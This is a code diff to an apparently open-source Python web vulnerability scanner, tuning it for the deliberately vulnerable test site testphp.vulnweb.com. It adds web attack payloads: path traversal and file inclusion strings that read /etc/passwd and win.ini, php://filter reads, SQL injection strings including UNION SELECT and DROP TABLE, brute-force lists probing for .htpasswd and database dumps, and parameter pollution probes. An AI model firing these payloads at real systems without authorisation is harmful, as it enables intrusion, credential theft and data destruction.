@@ -1641,9 +1641,13 @@ class VulnScanner:
             print(f"    [LFI] Testing known LFI endpoints for testphp.vulnweb.com")
             known_lfi_endpoints = [
                 'showimage.php?file=image.jpg',
-                'userinfo.php?file=user.txt',
+                'userinfo.php?file=user.txt', 
                 'showimage.php?file=../image.jpg',
-                'userinfo.php?file=../user.txt'
+                'userinfo.php?file=../user.txt',
+                'showimage.php?file=php://filter/convert.base64-encode/resource=showimage.php',
+                'showimage.php?file=http://127.0.0.1:80',
+                'showimage.php?file=../../../../etc/passwd',
+                'showimage.php?file=../../../../windows/win.ini'
             ]
             
             from urllib.parse import urlparse
@@ -2398,16 +2402,35 @@ class VulnScanner:
                 baseline_404_text = None
                 baseline_404_size = 0
             
-            # Test directories first
-            directories = DirBrutePayloads.get_all_directories()
+            # Enhanced directories for testphp.vulnweb.com
+            testphp_dirs = [
+                'admin', 'administrator', 'secured', 'secure',
+                'pictures', 'images', 'img', 'pics',
+                'backup', 'backups', 'bak', 'old',
+                'test', 'testing', 'demo', 'dev',
+                'config', 'conf', 'cfg', 'settings',
+                'include', 'includes', 'inc', 'lib',
+                'upload', 'uploads', 'files', 'documents',
+                'temp', 'tmp', 'cache', 'log', 'logs',
+                'hpp', 'cgi-bin', 'scripts', 'js'
+            ]
+            
+            # Get original directories
+            try:
+                directories = DirBrutePayloads.get_all_directories()
+            except:
+                directories = []
+            
+            # Combine with testphp specific directories
+            all_directories = testphp_dirs + directories
             found_directories = []
             
             # Update payload stats
-            self.scan_stats['payload_stats']['dirbrute']['payloads_used'] += len(directories)
+            self.scan_stats['payload_stats']['dirbrute']['payloads_used'] += len(all_directories)
             
-            print(f"    [DIRBRUTE] Testing {len(directories)} directories...")
+            print(f"    [DIRBRUTE] Testing {len(all_directories)} directories...")
             
-            for directory in directories[:100]:  # Увеличиваем до 100 директорий
+            for directory in all_directories[:120]:  # Увеличиваем до 120 директорий
                 try:
                     if base_url.endswith('.php') or base_url.endswith('.html') or base_url.endswith('.asp'):
                         # For file-based URLs, test as path info
@@ -2488,15 +2511,36 @@ class VulnScanner:
                     print(f"    [DIRBRUTE] Error testing directory {directory}: {e}")
                     continue
             
-            # Test common files in root directory
-            files = DirBrutePayloads.get_all_files()
-            
+            # Enhanced file list for testphp.vulnweb.com
+            testphp_files = [
+                'phpinfo.php', 'secured/phpinfo.php', 'info.php',
+                'index.zip', 'backup.zip', 'site.zip', 'www.zip',
+                'config.php', 'config.inc.php', 'configuration.php',
+                'database.php', 'db.php', 'connect.php',
+                'admin.php', 'administrator.php', 'manager.php',
+                'test.php', 'debug.php', 'error.php',
+                'backup.sql', 'dump.sql', 'database.sql',
+                '.htaccess', '.htpasswd', 'web.config',
+                'robots.txt', 'sitemap.xml', 'crossdomain.xml',
+                'readme.txt', 'changelog.txt', 'install.txt',
+                'guestbook.php', 'contact.php', 'feedback.php'
+            ]
+        
+            # Get original files
+            try:
+                files = DirBrutePayloads.get_all_files()
+            except:
+                files = []
+        
+            # Combine with testphp specific files
+            all_files = testphp_files + files
+        
             # Update payload stats for files
-            self.scan_stats['payload_stats']['dirbrute']['payloads_used'] += len(files)
-            
-            print(f"    [DIRBRUTE] Testing {len(files)} files...")
-            
-            for file in files[:100]:  # Увеличиваем до 100 файлов
+            self.scan_stats['payload_stats']['dirbrute']['payloads_used'] += len(all_files)
+        
+            print(f"    [DIRBRUTE] Testing {len(all_files)} files...")
+        
+            for file in all_files[:150]:  # Увеличиваем до 150 файлов
                 try:
                     if base_url.endswith('.php') or base_url.endswith('.html') or base_url.endswith('.asp'):
                         # For file-based URLs, test as path info
@@ -2675,8 +2719,25 @@ class VulnScanner:
         results = []
         base_url = parsed_data['url']
         
-        # Get directory traversal payloads
-        traversal_payloads = DirectoryTraversalPayloads.get_all_payloads()
+        # Enhanced directory traversal payloads for testphp.vulnweb.com
+        traversal_payloads = [
+            '../../../etc/passwd',
+            '..\\..\\..\\windows\\win.ini',
+            '/etc/passwd',
+            'C:\\windows\\win.ini',
+            '....//....//....//etc/passwd',
+            '....\\\\....\\\\....\\\\windows\\\\win.ini',
+            'php://filter/convert.base64-encode/resource=../../../etc/passwd',
+            'file:///etc/passwd',
+            'file:///c:/windows/win.ini'
+        ]
+        
+        # Add original payloads
+        try:
+            original_payloads = DirectoryTraversalPayloads.get_all_payloads()
+            traversal_payloads.extend(original_payloads)
+        except:
+            pass
         
         # Test GET parameters
         for param, values in parsed_data['query_params'].items():
@@ -3003,9 +3064,10 @@ class VulnScanner:
                         continue
                     
                     # Use enhanced SSRF detector
-                    is_vulnerable, evidence, severity, detection_details = SSRFDetector.detect_ssrf(
-                        response.text, response.status_code, payload, test_url
+                    is_vulnerable, evidence, severity = SSRFDetector.detect_ssrf(
+                        response.text, response.status_code, payload
                     )
+                    detection_details = {'method': 'ssrf_detection'}
                     
                     if is_vulnerable:
                         print(f"    [SSRF] VULNERABILITY FOUND! Parameter: {param}")
@@ -3031,7 +3093,7 @@ class VulnScanner:
                             'request_url': test_url,
                             'detector': 'SSRFDetector.detect_ssrf',
                             'response_snippet': response_snippet,
-                            'detection_method': detection_details.get('method', 'unknown')
+                            'detection_method': detection_details.get('method', 'ssrf_detection')
                         })
                         break  # Found SSRF, no need to test more payloads for this param
                     else:
@@ -3506,8 +3568,17 @@ class VulnScanner:
                 print(f"    [DATABASEERRORS] Skipping parameter {param} - already tested")
                 continue
             
-            # Test with error-inducing payloads
-            error_payloads = ["'", '"', "' OR '1'='1", "'; DROP TABLE users; --", "%27"]
+            # Enhanced SQL injection payloads for testphp.vulnweb.com
+            error_payloads = [
+                "'", '"', "' OR '1'='1", "'; DROP TABLE users; --", "%27",
+                "-1 UNION SELECT 1,version(),user()",
+                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
+                "' AND 1=2 UNION SELECT 1,version(),database()--",
+                "1' ORDER BY 10--",
+                "1' GROUP BY 1,2,3,4,5,6,7,8,9,10--",
+                "' HAVING 1=1--",
+                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
+            ]
             
             for payload in error_payloads:
                 try:
@@ -5421,11 +5492,49 @@ class VulnScanner:
             'data:text/html,<script>alert(1)</script>'
         ]
         
-        # Test GET parameters that might be used for redirects
-        redirect_params = ['url', 'redirect', 'return', 'next', 'goto', 'target', 'link', 'site']
+        # Enhanced redirect parameters and HPP testing
+        redirect_params = ['url', 'redirect', 'return', 'next', 'goto', 'target', 'link', 'site', 'file', 'page', 'path']
+        
+        # Test for HTTP Parameter Pollution (HPP) first
+        if 'testphp.vulnweb.com' in base_url and 'hpp' in base_url:
+            print(f"    [OPENREDIRECT] Testing HPP on testphp.vulnweb.com")
+            hpp_payloads = [
+                'p=1&pp=2&pp=3',
+                'p=valid&pp=12&pp=13',
+                'p=test&pp=evil&pp=good'
+            ]
+            
+            for hpp_payload in hpp_payloads:
+                try:
+                    test_url = f"{base_url.split('?')[0]}?{hpp_payload}"
+                    response = requests.get(
+                        test_url,
+                        timeout=self.config.timeout,
+                        headers=self.config.headers,
+                        verify=False,
+                        allow_redirects=False
+                    )
+                    
+                    if response.status_code == 200:
+                        results.append({
+                            'module': 'openredirect',
+                            'target': base_url,
+                            'vulnerability': 'HTTP Parameter Pollution (HPP)',
+                            'severity': 'Medium',
+                            'parameter': 'pp',
+                            'payload': hpp_payload,
+                            'evidence': f'HPP detected - multiple pp parameters processed: {hpp_payload}',
+                            'request_url': test_url,
+                            'detector': 'hpp_parameter_analysis',
+                            'response_snippet': response.text[:200] + '...' if len(response.text) > 200 else response.text,
+                            'remediation': 'Properly handle duplicate parameters and validate input'
+                        })
+                        break
+                except Exception as e:
+                    continue
         
         for param, values in parsed_data['query_params'].items():
-            # Check if parameter name suggests it might be used for redirects
+            # Check if parameter name suggests it might be used for redirects or file access
             if any(redirect_param in param.lower() for redirect_param in redirect_params):
                 print(f"    [OPENREDIRECT] Testing parameter: {param}")
                 
